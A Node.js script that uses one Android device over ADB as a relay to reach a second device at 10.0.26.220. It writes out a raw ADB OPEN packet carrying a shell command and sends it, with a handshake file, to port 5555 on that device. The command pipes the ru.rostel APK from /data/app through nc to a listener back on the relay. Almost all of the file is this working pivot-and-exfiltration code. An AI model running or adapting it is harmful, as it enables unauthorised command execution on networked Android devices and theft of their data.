const fs = require('fs');
const { execSync } = require('child_process');

const D1 = 'localhost:8479';
const D1_IP = '10.0.96.174';
const SRC = '10.0.26.220';

function buildOpen(cmd) {
  const payload = Buffer.from('shell:' + cmd + '\x00');
  const hdr = Buffer.alloc(24);
  hdr.writeUInt32LE(0x4e45504f, 0);
  hdr.writeUInt32LE(1, 4);
  hdr.writeUInt32LE(0, 8);
  hdr.writeUInt32LE(payload.length, 12);
  let crc = 0; for (const b of payload) crc += b;
  hdr.writeUInt32LE(crc >>> 0, 16);
  hdr.writeUInt32LE((0x4e45504f ^ 0xFFFFFFFF) >>> 0, 20);
  return Buffer.concat([hdr, payload]);
}

function pushAndRun(scriptContent, timeout) {
  fs.writeFileSync('/tmp/d1_script.sh', scriptContent);
  execSync(`adb -s ${D1} push /tmp/d1_script.sh /sdcard/script.sh 2>/dev/null`, { timeout: 10000 });
  try {
    return execSync(`adb -s ${D1} shell sh /sdcard/script.sh`, {
      timeout: timeout * 1000, encoding: 'utf8'
    }).trim();
  } catch (e) { return 'ERR: ' + (e.stdout || e.message).slice(0, 200); }
}

function pushOpenBin(cmd) {
  const open = buildOpen(cmd);
  fs.writeFileSync('/tmp/adb_open_relay.bin', open);
  execSync(`adb -s ${D1} push /tmp/adb_open_relay.bin /sdcard/open_relay.bin 2>/dev/null`, { timeout: 10000 });
}

// Test: Pull ru.rostel APK (204.7MB) using backgrounded nohup on .220
const pkg = 'ru.rostel';
const apkPath = '/data/app/~~PmomRTxq1p5ywefa9_lGnw==/ru.rostel-a12u2iLNxh0NxbBhsamL8w==/base.apk';
const PORT = 33600;

console.log(`Testing relay fix: ${pkg} (204.7MB)...`);

// Key fix: nohup + & so the command survives ADB session closure
const cmd220 = `nohup sh -c 'cat "${apkPath}" | nc -w 120 ${D1_IP} ${PORT}' > /dev/null 2>&1 & echo BGPID=$!`;
pushOpenBin(cmd220);

// D1 script: start listener, trigger .220 command, wait for data
const d1Script = `#!/system/bin/sh
rm -f /sdcard/recv_apk.bin
# Start listener - it will receive the full file
nc -l -p ${PORT} -w 180 > /sdcard/recv_apk.bin &
LPID=$!
sleep 1

# Send ADB command to .220 (nohup + background)
# Only need short connection - command backgrounds immediately on .220
(cat /sdcard/cnxn.bin; sleep 0.5; cat /sdcard/open_relay.bin; sleep 5) | nc -w 8 ${SRC} 5555 > /dev/null 2>&1

# Wait for listener to finish receiving
echo "Waiting for transfer..."
wait $LPID 2>/dev/null
sleep 2

# Report
SIZE=$(wc -c < /sdcard/recv_apk.bin 2>/dev/null)
echo "RECEIVED: $SIZE bytes"
`;

console.log('Running relay...');
const result = pushAndRun(d1Script, 240);
console.log(result);
